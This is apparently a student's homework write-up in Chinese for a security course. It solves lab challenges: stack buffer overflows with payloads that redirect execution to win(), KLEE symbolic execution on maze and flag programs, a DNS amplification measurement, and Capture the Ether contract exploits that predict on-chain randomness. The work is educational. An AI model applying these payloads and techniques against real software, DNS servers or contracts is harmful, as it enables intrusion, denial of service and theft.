# HW3

# 1.IoT

## 事前準備

一開始載的VM鍵盤輸入某些符號會有問題，要重新設定

`sudo nano /etc/default/keyboard `

把`XKBLAYOUT=”gb”`的`gb`改成`us`

然後`sudo setupcon`

## Stack0

(1) 至少輸入65個

這題很簡單

題目要我們去更改別的變數的值，就算過關

然後這題輸入可以Buffer Overflow

所以只要輸入夠長，就可蓋到其他變數

`./stack`

`AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

=> `you have changed the 'modified' variable`

![](https://i.imgur.com/sT5KkSQ.png)


## Stack1

(1) dcba
(2) 從cmp比較找到的

這題的話，是上一題的進階

除了要更改變數的值，還要改成他要求的value

`objdump -d ./stack1`

可以看到`main`最下面有`.word 0x61626364`

身為一個hacker，看到這個hex，就馬上知道是`abcd`的ascii code

(little endian是`dcba`)

回去看一下，可以看到這個字串是在`0x10508`被使用

這裡拿來做`cmp`比較

然後前面是`strcpy`

所以大致上程式邏輯是:

strcpy -> 比較是否跟`dcba`相同

然後`strcpy`這邊可以Buffer Overflow，蓋到她要拿來`cmp`比較的變數

所以我們第一步要先找，輸入多長的字串，才能蓋到這個變數

(然後這題很好心把那個變數的值印出來，我們只要慢慢增加長度，看那個值有沒有被改變就行)

最後的Payload:

`./stack 1234567890123456789012345678901234567890123456789012345678901234dcba`

前面的Padding長度是64

![](https://i.imgur.com/jub8Vbm.png)


## stack2

這題的話，跟上題沒差多少

只是輸入方式改成用環境變數 (export variable)

Payload:

`export GREENIE=$(perl -e 'print "A"x64, "\n\r"x3')`

![](https://i.imgur.com/hVTX1nP.png)



## stack 3

(1) 目標函數`win()`地址在`0x1047c`
(2) Buffer overflow控eip跳過去

`0x104b8`呼叫`gets()`輸入

我們知道`gets()`是危險函數，可以讀任意長度字串，導致Buffer overflow

觀察一波，可以發現Padding長度是`64`，超過64就會蓋到EIP(Program Counter)，就可以控制程式流程

所以我們的Payload:

`perl -e 'print "A"x64, "\x7c\x04\x01"' | ./stack3`

就能夠使得程式跑到`0x1047c`的`win()`

![](https://i.imgur.com/ZwRXhrD.png)


## stack4

(1) 0x1044c
(2) 一樣Buffer overflow找padding長度，控eip跳過去

這題跟上一題基本上差不多

只是他不會告訴我們目前EIP是多少

我們可以直接踹一波，只要蓋到EIP，然後value是一個不合法位址

那他就會噴`Segmentation Fault`

踹出來Padding長度是`68`

接著我們目標函數`win()`位址是`0x1044c`

所以我們的Payload:

`perl -e 'print "A"x68, "\x4c\x04\x01"' | ./stack4`

![](https://i.imgur.com/nVB1s01.png)

--- 


# 2.Symbolic Execution

## maze

- 新增`klee.h`
    - `#include "klee.h"`
- 將輸入替換掉
    - `klee_make_symbolic(program,ITERS,"program");`
- 在終點處設assert
    - `klee_assert(0);`

Payload:
`ddddssaaaassssddddddwddwwaawwwddddsss`

flag:
`BALSN{4M4z31nG_bUg_F0uNd_bY_KLEE!!}`


## flag_verifier

pass3和pass4用不到，但很多地方都會讓他們去算`cal`

很浪費時間，所以可以把它們註解掉，會跳過他們來剪枝

剩下還能優化的地方是，從code可以知道長度40-50才是flag可能出現的範圍

其他地方的話，就一樣把`scanf`換成`klee_make_symbolic`

然後設個`assert`就可以開始跑了

flag:

`BALSN{5ymb0l1c_Ex3cut10n_Hurr4y}`



----

# 3.DDOS

## a.

DNS放大攻擊


`dig +bufsize=4096 +dnssec any se @a.ns.se`

用wireshark抓包，可以發現query才74 bytes

response卻有3979 bytes

![](https://i.imgur.com/PqUqHMJ.png)

超過20倍

## b. 

沒解QQ

## c.

三者輸入如下，就能拿到flag：

`0`
`1e305`
`1`

科學記號是`float` type，會有rounding問題 (IEEE754)


flag:

`BALSN{Be_cAreFu1_0f_F10A7ING_PoINt_And_NaN}`


# 4.Capture the Ether

## 前置作業

- Remix (在線編譯、跟合約交互)
    - 貼上solidity source code (CaptureTheEther)
    - 編譯
    - 使用metamask來當provider (瀏覽器插件)
    - load contract address
    - 接著就能call contract function了
    - (其他呼叫方式: e.g. web3.js，需要contract abi和address來獲取instance)

## challenge0

- 呼叫`callme`
    - 學號是字串

## challenge1

- 呼叫`guessTheNumber`
    - 參數777

## challenge2

- 呼叫`bribeMe`
    - 這是payable function
    - 所以可送ETH過去
    - 這裏`msg.value`代表我們要送的數量
    - 所以送1 ether就能過關惹


## challenge3

- 呼叫`guessSecretNumber`

- 題目直接告訴我們答案的keccak256值:
    - `bytes32 answerHash = 0x313b2ea16b36f2e78c1275bfcca4e31f1e51c3a5d60beeefe6f4ec441e6f1dfc;`

- 而答案是`uint8`，範圍很小，可以硬爆:

```python
import sha3
from Crypto.Util.number import long_to_bytes
for i in range(256):
        k = sha3.keccak_256()
        k.update(long_to_bytes(i))
        print k.hexdigest()
        if k.hexdigest() == '313b2ea16b36f2e78c1275bfcca4e31f1e51c3a5d60beeefe6f4ec441e6f1dfc':
                print i
                break
```

爆出來是`146`

## challenge4

- 呼叫`guessRandomNumber`
    - c4ans在constructor被初始化 (建構子、合約創建時)
        - `c4Ans = uint16(keccak256(blockhash(block.number - 1), block.timestamp));`
    - 所以`block.number-1`應該是初始block的上一塊
        - block.number是這個: `3245076`
        - 上一塊就是: `3245075`
        - 對應的`blockhash`就是`0xb388f89fb847890e2d96c9a37c9d25beadef55fb84c2b1b2cf41dc7703bd08f5`
    - timestamp怎麼算?
        - 他其實就是`unix epoch`
        - 直接去看初始區塊，可以看到創建時間是: `2018/05/16 10:01:01 GMT`
        - 換成`unix epoch`就是`1526464861`
    - p.s. `uint16(xxx)`等同`(xxx)%(2**16)`
    - so...how to find the answer?
        - using this:
        ```
        function test() public view returns(uint16) {
            bytes32 h = 0xb388f89fb847890e2d96c9a37c9d25beadef55fb84c2b1b2cf41dc7703bd08f5;
            uint t = 1526464861;
            return uint16(keccak256(h, t));
        }   
        ```
        - 回傳值：47194 (這就是答案)
        - 小坑：如果寫成`return uint16(keccak256(0xb388f89fb847890e2d96c9a37c9d25beadef55fb84c2b1b2cf41dc7703bd08f5, 1526464861));`會悲劇
            - 因為`keccak256(a,b)`會把a,b pack起來
                - http://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#abi-packed-mode
            - 但不同data type pack的長度不同
                - `blockhash`的回傳值是`bytes32`
                - `block.timestamp`的回傳值是`uint`
            - 以這裡來說他不知道`1526464861`是uint，就會爛掉


## challenge5

這題的話，就直接部署一個合約，然後用這個合約呼叫`guessRuntimeRandomNumber`

參數就送`uint16(keccak256(blockhash(block.number - 1), block.timestamp))`

因為這樣交易一定會在同個block，且timestamp一定相同

```
contract test{
    function fuck() {
        address cte = 0x9b56a7c72d9782503fa1684ae0fca835c0973638;
        CaptureTheEther c = CaptureTheEther(cte);
        uint16 c5Ans = uint16(keccak256(blockhash(block.number - 1), block.timestamp));
        c.guessRuntimeRandomNumber("r06921077", c5Ans);
    }
}
```

